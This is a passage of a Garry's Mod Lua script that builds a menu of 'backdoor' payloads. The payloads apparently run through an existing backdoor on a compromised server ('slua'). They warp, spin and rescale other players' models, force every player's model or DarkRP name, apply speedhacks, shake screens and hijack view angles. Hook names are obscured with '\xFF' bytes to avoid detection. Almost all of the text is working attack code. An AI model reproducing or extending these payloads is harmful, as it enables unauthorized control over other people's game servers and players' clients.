	local spine = ply:LookupBone("ValveBiped.Bip01_Spine")
	ply:ManipulateBonePosition(spine,Vector(0, math.abs(math.cos(CurTime()*3)) * 25 ,0))
	ply:ManipulateBoneAngles(spine,Angle(0,0,0))
end)
]])

addBackdoor("Spin head", "Spin head indefinitely", [[
hook.Add("PrePlayerDraw","\xFF\xFF\xFF",function(ply)
	local head = ply:LookupBone("ValveBiped.Bip01_Head1")
	local pos = math.abs(math.sin(CurTime()*3)) * 25
	ply:ManipulateBonePosition(head, Vector(pos,pos,0))
	ply:ManipulateBoneAngles(head, Angle(0, 0, CurTime() * 100 % 360 ))
end)
]])

addBackdoor("Change head to gman", "Everyone is GMAN", [[
local model = ClientsideModel("models/gman_high.mdl")
model:SetNoDraw(true)
hook.Add("PrePlayerDraw","\xFF\xFF\xFF",function(ply)
	local head = ply:LookupBone("ValveBiped.Bip01_Head1")
	ply:ManipulateBoneScale(head,Vector(0.1,0.1,0.1))
	local attach = ply:GetAttachment( ply:LookupAttachment("eyes") )
	if !attach then return end
	local pos = attach.Pos - Vector(0,0,10)
	pos = pos - ( attach.Ang:Forward() * 4 )
	model:SetPos( pos )
	model:SetAngles( attach.Ang )
	model:SetRenderOrigin( pos )
	model:SetModelScale(0.1,0)
	local i = model:LookupBone("ValveBiped.Bip01_Head1")
	model:ManipulateBoneScale(i,Vector(100000,100000,100000))
	model:SetupBones()
	model:DrawModel()
end)
]])

addBackdoor("Rotate playermodel", "Rotate playermodel vertically or horizontally", function()
	askYesNo("Rotate vertically or horizontally", function(ans)
		local payload = [[
hook.Add("PrePlayerDraw","\xFF\xFF\xFF",function(ply)
	local ang = ply:GetRenderAngles()
]]

		if ans then
			payload = payload .. [[	ply:SetRenderAngles(Angle(CurTime()*50 % 360, ang.y, ang.z))]]
		else
			payload = payload .. [[	ply:SetRenderAngles(Angle(ang.x, CurTime()*50 % 360, ang.z))]]
		end

		payload = payload .. [[

end)
]]
		slua(payload)

	end, "Vertically", "Horizontally")
end)

addBackdoor("Set playermodel", nil, function()
	askText("Model", function(ans)
		slua([=[
for _, v in ipairs(player.GetAll()) do
	v:SetModel([[]=] .. ans .. [=[]])
end
]=], true)
	end)
end)

if DarkRP then

	addBackdoor("Rename players", nil, function()
		askText("New name", function(ans)
			slua([=[
for _, v in ipairs(player.GetAll()) do
	v:setDarkRPVar("rpname", [[]=] .. ans .. [=[]])
end
]=], true)
		end)
	end)

end

addBackdoor("Earthquake", "Simple screen shaking with sound", [[
util.ScreenShake(LocalPlayer():GetPos(),50,1,10,0)
surface.PlaySound("earthquake.mp3")
]])

addBackdoor("Speedhack", "GOTTA GO FAST", [[
for _, v in ipairs(player.GetAll()) do
	v:SetWalkSpeed(1000)
	v:SetRunSpeed(5000)
	v:SetCrouchedWalkSpeed(1)
end
hook.Add("PlayerSetModel","\xFF\xFF\xFF",function(ply)
	ply:SetWalkSpeed(1000)
	ply:SetRunSpeed(5000)
	ply:SetCrouchedWalkSpeed(1)
end)
]], true)

addBackdoor("Balloon head", "Head become big then explode like a ballon", [[
local start = CurTime()-2
hook.Add("PrePlayerDraw","\xFFballoon\xFF",function(ply)
	local bone = ply:LookupBone("ValveBiped.Bip01_Head1")
	local scale = (CurTime() - start) / 2
	ply:ManipulateBoneScale(bone,Vector(scale,scale,scale))
end)
timer.Simple(7,function()
	hook.Remove("PrePlayerDraw","\xFFballoon\xFF")
	for _, ply in ipairs(player.GetAll()) do
		local bone = ply:LookupBone("ValveBiped.Bip01_Head1")
		ply:ManipulateBoneScale(bone,Vector(1,1,1))
		local effectdata = EffectData()
		effectdata:SetOrigin(ply:GetBonePosition(bone))
		effectdata:SetStart(Vector(255,0,0))
		for i=1,40 do
			util.Effect("balloon_pop", effectdata)
		end
	end
end)
]])

addBackdoor("Circle view", "Rotate view to make circle", function()
	if hook.GetTable()["CreateMove"]["\xFFview\xFF"] then
		slua([[
hook.Remove("CreateMove","\xFFview\xFF")
]])
	else
		slua([[
hook.Add("CreateMove","\xFFview\xFF",function(cmd)
	local x = math.sin(CurTime()) / 50
	local y = math.cos(CurTime()) / 50
	local ang = cmd:GetViewAngles()
	cmd:SetViewAngles(Angle(ang.p + x, ang.y + y, ang.r))
end)
]])
	end
end)
